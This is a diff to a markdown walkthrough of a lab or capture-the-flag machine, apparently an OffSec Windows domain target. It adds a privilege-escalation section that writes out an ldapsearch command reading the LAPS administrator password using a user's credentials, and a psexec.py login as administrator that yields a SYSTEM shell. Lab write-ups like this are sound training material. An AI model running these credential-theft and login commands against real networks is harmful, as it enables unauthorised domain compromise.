@@ -24,7 +24,8 @@ IP: 192.168.142.122
 - Started netcat listener on kali machine
 - Executed the reverse shell and received a reverse shelll
 - FInd Local Administrator Password Solution (LAPS) is installed onto target machine
-- 
+- Perform ldapsearch query and find administrators password
+- Login as administrator utilizing psexec.py and receive a 
 - Text
 
 ## Improved skills
@@ -32,11 +33,13 @@ IP: 192.168.142.122
 - Findng allowed file extensions for Microsoft IIS to download a webshell
 - Downloading webshells/reverse shellls while logged into cadaver tool
 - Local Administrator Password Solution (LAPS) enumeration
+- psexec.py 
 
 ## Used tools
 - nmap
 - ldapsearch
 - cadaver
+- psexec.py
 
 ---
 
@@ -293,6 +296,10 @@ Enumerated top 200 UDP ports:
 ![](Images/Pasted%20image%2020221019012617.png)
 #LAPS #LocalAdministratorPasswordSolution
 
+
+## Privilege Escalation vector
+## Locate administrator password by performing an ldapsearch query and login as administrator utilizing psexec.py
+
 #### -I attempt to query LDAP for the local administrator password by typing "ldapsearch -x -H 'ldap://192.168.142.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd" and find administrators password is ",G4$4Yk-2n&x(]":
 
 ![](Images/Pasted%20image%2020221019012818.png)
@@ -300,9 +307,6 @@ Enumerated top 200 UDP ports:
 #### - Now that I have valid aministrator credentials I login with psexec.py by typing "python psexec.py hutch.offsec/administrator:',G4$4Yk-2n&x(]'@192.168.142.122" and receive a shell as nt authority\system:
 
 ![](Images/Pasted%20image%2020221019012951.png)
-
-## Privilege Escalation vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
 
 ---
 
